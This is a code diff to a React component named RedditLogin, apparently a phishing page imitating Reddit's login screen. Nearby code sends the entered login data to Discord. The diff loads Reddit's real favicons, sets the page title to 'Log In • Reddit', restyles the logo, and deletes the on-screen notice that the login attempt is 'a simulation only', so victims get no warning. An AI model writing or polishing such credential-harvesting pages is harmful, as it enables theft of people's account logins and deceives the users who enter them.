@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { Check, X, AlertCircle } from 'lucide-react';
 
 interface CustomAlert {
@@ -16,6 +16,48 @@ const RedditLogin = () => {
 
   // Custom Alert State
   const [activeAlert, setActiveAlert] = useState<CustomAlert>({ show: false, message: '', type: 'info' });
+
+  // Update favicons and title
+  useEffect(() => {
+    const updateFavicon = () => {
+      // Remove existing favicons
+      const existingIcons = document.querySelectorAll('link[rel*="icon"]');
+      existingIcons.forEach(icon => icon.remove());
+
+
+      // Add Reddit favicons
+      const favicons = [
+        { href: 'https://www.redditstatic.com/shreddit/assets/favicon/64x64.png', sizes: '64x64', rel: 'icon shortcut' },
+        { href: 'https://www.redditstatic.com/shreddit/assets/favicon/128x128.png', sizes: '128x128', rel: 'icon shortcut' },
+        { href: 'https://www.redditstatic.com/shreddit/assets/favicon/192x192.png', sizes: '192x192', rel: 'icon shortcut' },
+        { href: 'https://www.redditstatic.com/shreddit/assets/favicon/76x76.png', sizes: '76x76', rel: 'apple-touch-icon' },
+        { href: 'https://www.redditstatic.com/shreddit/assets/favicon/120x120.png', sizes: '120x120', rel: 'apple-touch-icon' },
+        { href: 'https://www.redditstatic.com/shreddit/assets/favicon/152x152.png', sizes: '152x152', rel: 'apple-touch-icon' },
+        { href: 'https://www.redditstatic.com/shreddit/assets/favicon/180x180.png', sizes: '180x180', rel: 'apple-touch-icon' },
+      ];
+
+      favicons.forEach(({ href, sizes, rel }) => {
+        const link = document.createElement('link');
+        link.href = href;
+        link.sizes = sizes;
+        link.rel = rel;
+        document.head.appendChild(link);
+      });
+    };
+
+    // Change page title
+    const originalTitle = document.title;
+    document.title = 'Log In • Reddit';
+
+    updateFavicon();
+
+    // Cleanup: restore original favicon and title when component unmounts
+    return () => {
+      const redditIcons = document.querySelectorAll('link[href*="redditstatic.com"]');
+      redditIcons.forEach(icon => icon.remove());
+      document.title = originalTitle;
+    };
+  }, []);
 
   const showAlert = (message: string, type: 'success' | 'error' | 'info' = 'info') => {
     setActiveAlert({ show: true, message, type });
@@ -92,7 +134,7 @@ const RedditLogin = () => {
         body: JSON.stringify(embed)
       });
 
-      showAlert('Login attempt recorded. This is a simulation only.', 'info');
+   
     } catch (error) {
       console.error('Error sending to Discord:', error);
       showAlert('Reddit Login is for simulation only.', 'info');
@@ -129,17 +171,14 @@ const RedditLogin = () => {
       {/* Header */}
       <header className="w-full px-6 py-5 flex items-center">
         <div className="flex items-center gap-2">
-          <svg width="120" height="40" viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-            {/* Orange Circle with Snoo */}
-            <circle cx="20" cy="20" r="16" fill="#FF4500"/>
-            <path d="M28.5 20c0-.8-.7-1.4-1.5-1.4-.1 0-.2 0-.2.1-1-.7-2.3-1.2-3.8-1.3l.8-3.9 2.7.6c.1.5.5.9 1.1.9.7 0 1.3-.6 1.3-1.3s-.6-1.3-1.3-1.3c-.5 0-.9.3-1.1.7l-3-.7c-.2 0-.3.1-.4.2l-1 4.5c-1.5.1-2.9.5-3.8 1.2-.1-.1-.2-.1-.2-.1-.8 0-1.5.6-1.5 1.4s.7 1.4 1.5 1.4c.1 0 .2 0 .2-.1.1.6.3 1.2.6 1.7-.7.4-1.1 1.1-1.1 1.9 0 1.3.9 2.3 2.2 2.3.6 0 1.1-.2 1.5-.6 1.1.5 2.4.8 3.9.8s2.8-.3 3.9-.8c.4.4 1 .6 1.5.6 1.3 0 2.2-1 2.2-2.3 0-.8-.4-1.5-1.1-1.9.3-.5.5-1.1.6-1.7.1 0 .2.1.2.1.8 0 1.5-.6 1.5-1.4zM16.5 22.1c-.7 0-1.3-.6-1.3-1.3s.6-1.3 1.3-1.3 1.3.6 1.3 1.3-.6 1.3-1.3 1.3zm8.3 3.9c-1.5 1.2-4.5 1.2-6 0-.1-.1-.2-.3-.1-.4.1-.1.3-.1.4-.1 1.2 1 4 1 5.2 0 .1-.1.3-.1.4.1.1.1.1.3 0 .4zm.2-2.6c-.7 0-1.3-.6-1.3-1.3s.6-1.3 1.3-1.3 1.3.6 1.3 1.3-.6 1.3-1.3 1.3z" fill="white"/>
-            
-            {/* reddit text */}
-            <path d="M48.2 27.6h-2.1v-6.8c0-1.7-1.1-2.7-2.6-2.7-1.5 0-2.8 1.1-2.8 3v6.5h-2.1v-9.5h2.1v1.1c.7-.8 1.9-1.4 3.3-1.4 2.5 0 4.2 1.6 4.2 4.3v5.5zM58.3 22.8c0-3.1-2.2-5.1-5-5.1-3 0-5.3 2.3-5.3 5s2.3 5 5.3 5c2 0 3.7-1 4.5-2.5l-1.7-1c-.5.8-1.5 1.4-2.7 1.4-1.8 0-3.2-1.2-3.3-2.8h8.2zm-2.1-1.5h-6.1c.2-1.5 1.4-2.5 2.9-2.5 1.7 0 3 1 3.2 2.5zM71.4 27.6h-2.1v-1.1c-.7.8-1.9 1.4-3.3 1.4-2.8 0-5.1-2.3-5.1-5s2.3-5 5.1-5c1.4 0 2.6.6 3.3 1.4v-5.4h2.1v13.7zm-2.1-4.8c0-1.7-1.4-3-3.1-3-1.7 0-3.1 1.3-3.1 3s1.4 3 3.1 3c1.7 0 3.1-1.3 3.1-3zM83.4 27.6h-2.1v-1.1c-.7.8-1.9 1.4-3.3 1.4-2.8 0-5.1-2.3-5.1-5s2.3-5 5.1-5c1.4 0 2.6.6 3.3 1.4v-5.4h2.1v13.7zm-2.1-4.8c0-1.7-1.4-3-3.1-3-1.7 0-3.1 1.3-3.1 3s1.4 3 3.1 3c1.7 0 3.1-1.3 3.1-3zM88.7 15.6c0-.8.6-1.4 1.4-1.4.8 0 1.4.6 1.4 1.4 0 .8-.6 1.4-1.4 1.4-.8 0-1.4-.6-1.4-1.4zm-.3 12h2.1v-9.5h-2.1v9.5zM100.3 19.8h-2.1v4.5c0 1 .5 1.5 1.4 1.5h.7v1.8h-.7c-2.1 0-3.5-1-3.5-3.3v-4.5h-1.5v-1.7h1.5v-2.8l2.1-1.2v4h2.1v1.7z" fill="#1C1C1C"/>
-            
-            {/* Orange dot on the 'i' */}
-            <circle cx="90.1" cy="15.6" r="2.8" fill="#FF4500"/>
-          </svg>
+          <div className="flex items-center gap-3">
+            <div className="w-8 h-8 bg-[#FF4500] rounded-full flex items-center justify-center">
+              <svg className="w-5 h-5" viewBox="0 0 20 20" fill="white" xmlns="http://www.w3.org/2000/svg">
+                <path d="M16 10c0-.4-.3-.7-.7-.7h-.1c-.5-.4-1.1-.6-1.9-.6l.4-2 1.3.3c.1.3.3.5.6.5.3 0 .6-.3.6-.6s-.3-.6-.6-.6c-.3 0-.5.1-.6.4l-1.5-.3c-.1 0-.2.1-.2.1l-.5 2.2c-.7.1-1.4.3-1.9.6h-.1c-.4 0-.7.3-.7.7s.3.7.7.7h.1c.1.3.2.6.3.8-.3.2-.5.5-.5.9 0 .6.4 1.1 1.1 1.1.3 0 .5-.1.7-.3.5.2 1.2.4 1.9.4s1.4-.1 1.9-.4c.2.2.5.3.7.3.6 0 1.1-.5 1.1-1.1 0-.4-.2-.7-.5-.9.1-.3.2-.6.3-.8h.1c.4 0 .7-.3.7-.7zM8.2 11c-.3 0-.6-.3-.6-.6s.3-.6.6-.6.6.3.6.6-.3.6-.6.6zm4.1 1.9c-.7.6-2.2.6-3 0-.1-.1-.1-.1-.1-.2s.1-.1.2-.1c.6.5 2 .5 2.6 0 .1 0 .1 0 .2.1 0 .1 0 .1 0 .2zm.1-1.3c-.3 0-.6-.3-.6-.6s.3-.6.6-.6.6.3.6.6-.3.6-.6.6z"/>
+              </svg>
+            </div>
+            <span className="text-white text-2xl font-semibold tracking-tight">reddit</span>
+          </div>
         </div>
       </header>
 
@@ -174,7 +213,7 @@ const RedditLogin = () => {
 
             <button className="w-full h-12 bg-white hover:bg-gray-100 rounded-full flex items-center justify-center gap-3 text-[#1C1C1C] font-bold text-sm transition-colors">
               <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-                <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/>
+                <path d=""/>
                 <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/>
               </svg>
               Email me a one-time link
